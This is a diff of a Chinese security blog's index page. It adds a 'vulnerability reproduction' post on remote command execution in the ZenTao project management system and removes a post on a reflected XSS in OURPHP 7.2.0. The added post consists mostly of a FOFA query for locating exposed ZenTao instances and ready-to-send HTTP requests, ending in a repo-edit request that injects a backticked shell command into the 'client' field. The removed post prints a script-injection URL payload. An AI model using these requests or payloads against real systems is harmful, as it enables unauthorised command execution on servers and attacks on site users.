@@ -255,6 +255,89 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/" class="post-title-link" itemprop="url">【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-15 15:55:24 / 修改时间：15:56:03" itemprop="dateCreated datePublished" datetime="2023-04-15T15:55:24+08:00">2023-04-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）"><a href="#【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）" class="headerlink" title="【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）"></a>【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）</h1><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2 </span><br><span class="line"></span><br><span class="line">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 </span><br><span class="line"></span><br><span class="line">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1</span><br></pre></td></tr></table></figure>
+
+<h1 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h1><p><code>fofa：title=&quot;用户登录 - 禅道&quot; </code></p>
+<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415154930327.png" alt="image-20230415154930327"></p>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>先依次发送如下两个请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /misc-captcha-user.html HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: zentaosid=mdcv95902sc4i9kq3k3hda4dr7; lang=zh-cn; device=desktop; theme=default; windowWidth=1536; windowHeight=703</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155015483.png" alt="image-20230415155015483"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /repo-create.html HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://xxx:xx/repo-edit-1-0.html</span><br><span class="line">Host: xxx.xxx.xx.xx</span><br><span class="line">Content-Length: 111</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155106384.png" alt="image-20230415155106384"></p>
+<p>发送如下请求，如果存在漏洞，则返回包中会包含命令执行的结果，如执行‘id’命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /repo-edit-10000-10000.html HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://xxxx/repo-edit-1-0.html</span><br><span class="line">Host: xxxx</span><br><span class="line">Content-Length: 26</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">SCM=Subversion&amp;client=`id`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155155819.png" alt="image-20230415155155819"></p>
+<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155217681.png" alt="image-20230415155217681"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%EF%BC%88Hikvision%EF%BC%89%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -418,90 +501,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/" class="post-title-link" itemprop="url">OURPHP  =v7.2.0 ourphp_out.php Reflection xss</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-27 08:39:42 / 修改时间：08:40:18" itemprop="dateCreated datePublished" datetime="2023-03-27T08:39:42+08:00">2023-03-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">-cve</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="OURPHP-v7-2-0-ourphp-out-php-Reflection-xss"><a href="#OURPHP-v7-2-0-ourphp-out-php-Reflection-xss" class="headerlink" title="OURPHP  =v7.2.0 ourphp_out.php Reflection xss"></a>OURPHP  =v7.2.0 ourphp_out.php Reflection xss</h1><p>Direct echo in the <code>/client/manage/ourphp_out.php</code> file, in addition to controllable variables, allows attackers to execute xss code.</p>
-<p>Let’s look directly at the code as follows</p>
-<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083656395.png" alt="image-20230327083656395"></p>
-<p>If the ourphp_admin parameter is logout, we will echo a controllable variable.<br>The controllable variable is out<br>And there’s a script tag in front, just close it for him.<br>So our payload is</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h2><p>Let’s download the code through the following link and install it directly in PHP Study.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://down.chinaz.com/api/index/download?id=51308&amp;type=code</span><br></pre></td></tr></table></figure>
-
-<p>After installation, directly access the following path</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083926514.png" alt="image-20230327083926514"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -569,7 +572,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
